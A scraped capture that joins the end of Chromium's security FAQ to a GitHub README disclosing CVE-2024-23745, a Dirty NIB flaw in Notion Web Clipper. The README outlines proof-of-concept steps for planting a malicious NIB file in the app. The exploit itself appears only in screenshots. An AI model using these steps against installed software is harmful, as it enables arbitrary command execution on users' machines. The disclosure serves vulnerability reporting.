* Chrome's network stack, [root store](https://www.chromium.org/Home/chromium-security/root-ca-policy/) and associated technology are not used, so the platform will make different decisions about what web servers to trust.
* Sandboxing APIs are not available for native code.

Given that the fundamentals of the browser are so different, and given these limitations, Chrome for iOS has historically not consistently implemented some of Chrome's [standard security guidelines](/chromium/src/%2B/refs/heads/main/docs/security/rules.md). This includes the important [Rule of Two](/chromium/src/%2B/refs/heads/main/docs/security/rule-of-2.md). Future Chrome for iOS features should meet all guidelines except in cases where the lack of platform APIs make it unrealistic. (The use of WebAssembly-based sandboxing is currently considered unrealistic though this could change in future.)

If the Rule of Two cannot be followed, features for Chrome for iOS should nevertheless follow it as closely as possible, and adopt additional mitigations where they cannot:

* First consider adding a validation layer between unsafe code and web contents, or adopting memory-safe parsers at the boundary between the renderer and the browser process. Consider changing the design of the feature so the riskiest parsing can happen in javascript injected in the renderer process.
* Any unsafe unsandboxed code that is exposed to web contents or other untrustworthy data sources must be extensively tested and fuzzed.

The Chrome team is enthusiastic about the future possibility of making a version of Chrome for iOS that meets our usual security standards if richer platform facilities become widely available: this will require revisiting existing features to see if adjustment is required.

### Are all Chrome updates important?

Yes - see [our updates FAQ](/chromium/src/%2B/refs/heads/main/docs/security/updates.md).

### What older Chrome versions are supported?

We always recommend being on the most recent Chrome stable version - see [our updates FAQ](/chromium/src/%2B/refs/heads/main/docs/security/updates.md).

### I'm making a Chromium-based browser. How should I secure it?

If you want to make a browser based on Chromium, you should stay up to date with Chromium's security fixes. There are adversaries who weaponize fixed Chromium bugs (“n-day vulnerabilities”) to target browsers which haven’t yet absorbed those fixes.

Decide whether your approach is to stay constantly up to date with Chromium releases, or to backport security fixes onto some older version, upgrading Chromium versions less frequently.

Backporting security fixes sounds easier than forward-porting features, but in our experience, this is false. Chromium releases 400+ security bug fixes per year ([example query](https://bugs.chromium.org/p/chromium/issues/list?q=type%3DBug-Security%20has%3Arelease%20closed%3Etoday-730%20closed%3Ctoday-365%20allpublic&can=1)). Some downstream browsers take risks by backporting only Medium+ severity fixes, but that's still over 300 ([example query](https://bugs.chromium.org/p/chromium/issues/list?q=type%3DBug-Security%20has%3Arelease%20closed%3Etoday-730%20closed%3Ctoday-365%20allpublic%20Security_Severity%3DMedium%2CHigh%2CCritical&can=1)). Most are trivial cherry-picks; but others require rework and require versatile engineers who can make good decisions about any part of a large codebase.

Our recommendation is to stay up-to-date with Chrome's released versions. You should aim to release a version of your browser within just a few days of each Chrome [stable release](https://chromereleases.googleblog.com/search/label/Stable%20updates). If your browser is sufficiently widely-used, you can [apply for advance notice of fixed vulnerabilities](https://www.chromium.org/Home/chromium-security/) to make this a little easier.

Finally, if you choose the backporting approach, please explain the security properties to your users. Some fraction of security improvements cannot be backported. This can happen for several reasons, for example: because they depend upon architectural changes (e.g. breaking API changes); because the security improvement is a significant new feature; or because the security improvement is the removal of a broken feature.

### How can I appeal a Safe Browsing warning?

To request a review of warnings relating to your own website, use the [Security Issues report](https://support.google.com/webmasters/answer/9044101) page in your Google Search Console. If the warning applies to another site, you may be able to use <https://safebrowsing.google.com/safebrowsing/report_error/>, though you are likely better off contacting the site owner.

If your concern relates to malware warnings, you may find the warning in your Security Issues report and request a review from there. There is no separate appeal form or process at this time. Please follow these [guidelines](https://developers.google.com/search/docs/monitor-debug/security/malware#guidelines) to avoid having your binary show warnings from Safe Browsing.

Powered by [Gitiles](https://gerrit.googlesource.com/gitiles/)| [Privacy](https://policies.google.com/privacy)| [Terms](https://policies.google.com/terms)[source](/chromium/src/%2Bshow/refs/heads/main/docs/security/faq.md)[log](/chromium/src/%2Blog/refs/heads/main/docs/security/faq.md)[blame](/chromium/src/%2Bblame/refs/heads/main/docs/security/faq.md)

=== Content from github.com_69d9057d_20250114_223627.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flouiselalanne%2FCVE-2024-23745)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flouiselalanne%2FCVE-2024-23745)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=louiselalanne%2FCVE-2024-23745)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[louiselalanne](/louiselalanne)
/
**[CVE-2024-23745](/louiselalanne/CVE-2024-23745)**
Public

* [Notifications](/login?return_to=%2Flouiselalanne%2FCVE-2024-23745) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2Flouiselalanne%2FCVE-2024-23745)
* [Star
   2](/login?return_to=%2Flouiselalanne%2FCVE-2024-23745)

In Notion Web Clipper 1.0.3(7), a .nib file is susceptible to the Dirty NIB attack.

[2
stars](/louiselalanne/CVE-2024-23745/stargazers) [1
fork](/louiselalanne/CVE-2024-23745/forks) [Branches](/louiselalanne/CVE-2024-23745/branches) [Tags](/louiselalanne/CVE-2024-23745/tags) [Activity](/louiselalanne/CVE-2024-23745/activity)
 [Star](/login?return_to=%2Flouiselalanne%2FCVE-2024-23745)

 [Notifications](/login?return_to=%2Flouiselalanne%2FCVE-2024-23745) You must be signed in to change notification settings

* [Code](/louiselalanne/CVE-2024-23745)
* [Issues
  0](/louiselalanne/CVE-2024-23745/issues)
* [Pull requests
  0](/louiselalanne/CVE-2024-23745/pulls)
* [Actions](/louiselalanne/CVE-2024-23745/actions)
* [Projects
  0](/louiselalanne/CVE-2024-23745/projects)
* [Security](/louiselalanne/CVE-2024-23745/security)
* [Insights](/louiselalanne/CVE-2024-23745/pulse)

Additional navigation options

* [Code](/louiselalanne/CVE-2024-23745)
* [Issues](/louiselalanne/CVE-2024-23745/issues)
* [Pull requests](/louiselalanne/CVE-2024-23745/pulls)
* [Actions](/louiselalanne/CVE-2024-23745/actions)
* [Projects](/louiselalanne/CVE-2024-23745/projects)
* [Security](/louiselalanne/CVE-2024-23745/security)
* [Insights](/louiselalanne/CVE-2024-23745/pulse)

# louiselalanne/CVE-2024-23745

    main[Branches](/louiselalanne/CVE-2024-23745/branches)[Tags](/louiselalanne/CVE-2024-23745/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[2 Commits](/louiselalanne/CVE-2024-23745/commits/main/) | | |
| [README.md](/louiselalanne/CVE-2024-23745/blob/main/README.md "README.md") | | [README.md](/louiselalanne/CVE-2024-23745/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2024-23745

In Notion Web Clipper 1.0.3(7), a .nib file is susceptible to the Dirty NIB attack. NIB files can be manipulated to execute arbitrary commands. Additionally, even if a NIB file is modified within an application, Gatekeeper may still permit the execution of the application, enabling the execution of arbitrary commands within the application's context.

## Impact

Attackers could exploit this vulnerability to execute unauthorized commands within the Notion application, potentially compromising sensitive user data or performing malicious actions.

## PoC

* First, you need create de malicious NIB

[![image1](https://private-user-images.githubusercontent.com/100588945/299810902-21768f9c-f0e2-4987-b0eb-89691777ed17.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODEwOTAyLTIxNzY4ZjljLWYwZTItNDk4Ny1iMGViLTg5NjkxNzc3ZWQxNy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kZGQzOWJmMDY2YTQ2MjViMmE1MGE2MTE4NDdlN2UxNmRjNzgwYjExYzAxNDI3ZjVmNjI5YTc0ODAzYzBiYTQzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.VjdtwQTv4KMHTtJFmiXSw_AeS8MkHKBFgRhEdY4M_2s)](https://private-user-images.githubusercontent.com/100588945/299810902-21768f9c-f0e2-4987-b0eb-89691777ed17.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODEwOTAyLTIxNzY4ZjljLWYwZTItNDk4Ny1iMGViLTg5NjkxNzc3ZWQxNy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kZGQzOWJmMDY2YTQ2MjViMmE1MGE2MTE4NDdlN2UxNmRjNzgwYjExYzAxNDI3ZjVmNjI5YTc0ODAzYzBiYTQzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.VjdtwQTv4KMHTtJFmiXSw_AeS8MkHKBFgRhEdY4M_2s)

[![image2](https://private-user-images.githubusercontent.com/100588945/299811012-d5cef122-b6fa-44f5-92ad-fac6f3627b71.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODExMDEyLWQ1Y2VmMTIyLWI2ZmEtNDRmNS05MmFkLWZhYzZmMzYyN2I3MS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kNjhlZDdmZGE3ZGQ4Y2UwMDYwNmFjMWI3NzIzNDZiYjEyM2I5MWZkZDJmNWYwNTI4YjNlMzk4NzBiNzY2NDQ5JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.v1NHEUJZdTxAZkn9nOiwhzqF87liub2FA0JBaEbCqho)](https://private-user-images.githubusercontent.com/100588945/299811012-d5cef122-b6fa-44f5-92ad-fac6f3627b71.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODExMDEyLWQ1Y2VmMTIyLWI2ZmEtNDRmNS05MmFkLWZhYzZmMzYyN2I3MS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kNjhlZDdmZGE3ZGQ4Y2UwMDYwNmFjMWI3NzIzNDZiYjEyM2I5MWZkZDJmNWYwNTI4YjNlMzk4NzBiNzY2NDQ5JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.v1NHEUJZdTxAZkn9nOiwhzqF87liub2FA0JBaEbCqho)

[![image3](https://private-user-images.githubusercontent.com/100588945/299816885-d82514c8-b6bb-4a40-94eb-c47db86228f9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE2ODg1LWQ4MjUxNGM4LWI2YmItNGE0MC05NGViLWM0N2RiODYyMjhmOS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wYzdjOTVkNDQ3OGE0ZTY1N2ViZjcwNjI4YWMyODQxOTJlZmM2Mzk2YmVmMDBiZGZiZjM1MTJiNmZhMmE1NDdjJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.VvMF0os7Q5Eve8H6hSO7QGthc5oq7ZZkNOY9jc5wbnM)](https://private-user-images.githubusercontent.com/100588945/299816885-d82514c8-b6bb-4a40-94eb-c47db86228f9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE2ODg1LWQ4MjUxNGM4LWI2YmItNGE0MC05NGViLWM0N2RiODYyMjhmOS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wYzdjOTVkNDQ3OGE0ZTY1N2ViZjcwNjI4YWMyODQxOTJlZmM2Mzk2YmVmMDBiZGZiZjM1MTJiNmZhMmE1NDdjJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.VvMF0os7Q5Eve8H6hSO7QGthc5oq7ZZkNOY9jc5wbnM)

[![image4](https://private-user-images.githubusercontent.com/100588945/299818746-c3adaa53-547c-49d4-bdc6-27e519fe9dbd.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE4NzQ2LWMzYWRhYTUzLTU0N2MtNDlkNC1iZGM2LTI3ZTUxOWZlOWRiZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1jMDgzZjk5MDZjODA3YjlhZGU2ZTY1M2YzOTA4NzliOWE3N2RmNmViYjBjMWNmNjI3ZGY4YTI2NzBmM2E1MjY4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.zylnTfL4VxNT4BOHrh7I481R7UM8n7uDQeaXZK1-_sA)](https://private-user-images.githubusercontent.com/100588945/299818746-c3adaa53-547c-49d4-bdc6-27e519fe9dbd.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE4NzQ2LWMzYWRhYTUzLTU0N2MtNDlkNC1iZGM2LTI3ZTUxOWZlOWRiZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1jMDgzZjk5MDZjODA3YjlhZGU2ZTY1M2YzOTA4NzliOWE3N2RmNmViYjBjMWNmNjI3ZGY4YTI2NzBmM2E1MjY4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.zylnTfL4VxNT4BOHrh7I481R7UM8n7uDQeaXZK1-_sA)

More details in: <https://blog.xpnsec.com/dirtynib/>

- Notion Application

[![image6](https://private-user-images.githubusercontent.com/100588945/299819221-b6786f30-59fe-482c-827a-cde49930bc36.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE5MjIxLWI2Nzg2ZjMwLTU5ZmUtNDgyYy04MjdhLWNkZTQ5OTMwYmMzNi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0zMDdjNjQwMTFhZWIyOGNmMzhhNzE3ZDc0OGJhZmY1MTQxYmJlNTA1ZDJjMzFlYjlhNTAwYmFiNjE3ZTM5ZGJiJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.JgioOTOMZNSHHGayXIbQPBLAeS-HtHkziz0_hUpXmNg)](https://private-user-images.githubusercontent.com/100588945/299819221-b6786f30-59fe-482c-827a-cde49930bc36.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE5MjIxLWI2Nzg2ZjMwLTU5ZmUtNDgyYy04MjdhLWNkZTQ5OTMwYmMzNi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0zMDdjNjQwMTFhZWIyOGNmMzhhNzE3ZDc0OGJhZmY1MTQxYmJlNTA1ZDJjMzFlYjlhNTAwYmFiNjE3ZTM5ZGJiJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.JgioOTOMZNSHHGayXIbQPBLAeS-HtHkziz0_hUpXmNg)

[![image7](https://private-user-images.githubusercontent.com/100588945/299819291-5c897fea-1271-45e2-bbe6-1bbfc4afec44.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE5MjkxLTVjODk3ZmVhLTEyNzEtNDVlMi1iYmU2LTFiYmZjNGFmZWM0NC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT02ZTA1MjYwZTdmMTk4NGNhNDNkNmU2MDZjN2I0ZGZjMWMwMTJhMGJhYmU4MGIxMjRkMTgzNGQwMWQyMmNlMTQ0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.shI3YX1tYccmdX3zhZ135giGt5xg15Ohq0cMGJ8zSvw)](https://private-user-images.githubusercontent.com/100588945/299819291-5c897fea-1271-45e2-bbe6-1bbfc4afec44.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE5MjkxLTVjODk3ZmVhLTEyNzEtNDVlMi1iYmU2LTFiYmZjNGFmZWM0NC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT02ZTA1MjYwZTdmMTk4NGNhNDNkNmU2MDZjN2I0ZGZjMWMwMTJhMGJhYmU4MGIxMjRkMTgzNGQwMWQyMmNlMTQ0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.shI3YX1tYccmdX3zhZ135giGt5xg15Ohq0cMGJ8zSvw)

- Copy malicious nib to app

[![image8](https://private-user-images.githubusercontent.com/100588945/299819327-64f2e7c6-0d25-4bb9-877b-47a1dda0aa5d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE5MzI3LTY0ZjJlN2M2LTBkMjUtNGJiOS04NzdiLTQ3YTFkZGEwYWE1ZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00NzM2NjhkMzU1NDNiMmFjNDIxNDZhOWI2ZTlkMzYxODZjOWMxY2Q3MGMwOTAzYjhmNTAwMWMwYWE0MWViYjI0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.nOhu6tqi0-H-1NOaU8GkhHqEU7v7b1S85x8Du9Ib2bo)](https://private-user-images.githubusercontent.com/100588945/299819327-64f2e7c6-0d25-4bb9-877b-47a1dda0aa5d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4OTQ0ODUsIm5iZiI6MTczNjg5NDE4NSwicGF0aCI6Ii8xMDA1ODg5NDUvMjk5ODE5MzI3LTY0ZjJlN2M2LTBkMjUtNGJiOS04NzdiLTQ3YTFkZGEwYWE1ZC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMjM2MjVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00NzM2NjhkMzU1NDNiMmFjNDIxNDZhOWI2ZTlkMzYxODZjOWMxY2Q3MGMwOTAzYjhmNTAwMWMwYWE0MWViYjI0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.nOhu6tqi0-H-1NOaU8GkhHqEU7v7b1S85x8Du9Ib2bo)

